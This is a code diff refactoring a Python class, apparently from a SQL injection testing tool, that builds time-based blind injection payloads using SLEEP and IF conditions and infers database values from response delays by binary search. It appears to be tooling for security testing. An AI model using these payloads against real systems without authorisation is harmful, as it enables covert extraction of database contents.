@@ -29,12 +29,10 @@ class TimeInjector:
         in the response body; the response time itself is the signal.
         """
 
-        r_normal = self.requester.send(
-            url, {param: ctx.prefix + "AND 1=1" + ctx.suffix}
-        )
+        r_normal = self.requester.send({param: ctx.prefix + "AND 1=1" + ctx.suffix})
 
         r_sleep = self.requester.send(
-            url, {param: f"{ctx.prefix}AND SLEEP({sleep}){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND SLEEP({sleep}){ctx.suffix}"}
         )
 
         return self.analyzer.is_delayed(r_normal, r_sleep, sleep)
@@ -58,7 +56,7 @@ class TimeInjector:
 
         # Baseline request containing a condition that does not trigger a delay.
         r_baseline = self.requester.send(
-            url, {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
         )
 
         low = 0
@@ -72,7 +70,7 @@ class TimeInjector:
                 f"{ctx.prefix}AND IF({expression}>{mid},SLEEP({sleep}),0){ctx.suffix}"
             )
 
-            response = self.requester.send(url, {param: payload})
+            response = self.requester.send({param: payload})
 
             # A significant increase in response time means that
             # expression > mid evaluated to true.
@@ -105,7 +103,7 @@ class TimeInjector:
         # Non-delaying baseline. The condition is always false, so SLEEP()
         # is never executed.
         r_baseline = self.requester.send(
-            url, {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
         )
 
         for digit in range(1, expr_name_len + 1):
@@ -126,7 +124,7 @@ class TimeInjector:
                     f"{ctx.suffix}"
                 )
 
-                response = self.requester.send(url, {param: payload})
+                response = self.requester.send({param: payload})
 
                 # Delayed response => tested condition is true.
                 if self.analyzer.is_delayed(r_baseline, response, sleep):
@@ -159,7 +157,7 @@ class TimeInjector:
 
         # Non-delaying baseline used for timing comparisons.
         r_baseline = self.requester.send(
-            url, {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
+            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
         )
 
         for digit in range:
@@ -180,7 +178,7 @@ class TimeInjector:
                     f"{ctx.suffix}"
                 )
 
-                response = self.requester.send(url, {param: payload})
+                response = self.requester.send({param: payload})
 
                 # A delayed response means the condition evaluated to true.
                 if self.analyzer.is_delayed(r_baseline, response, sleep):
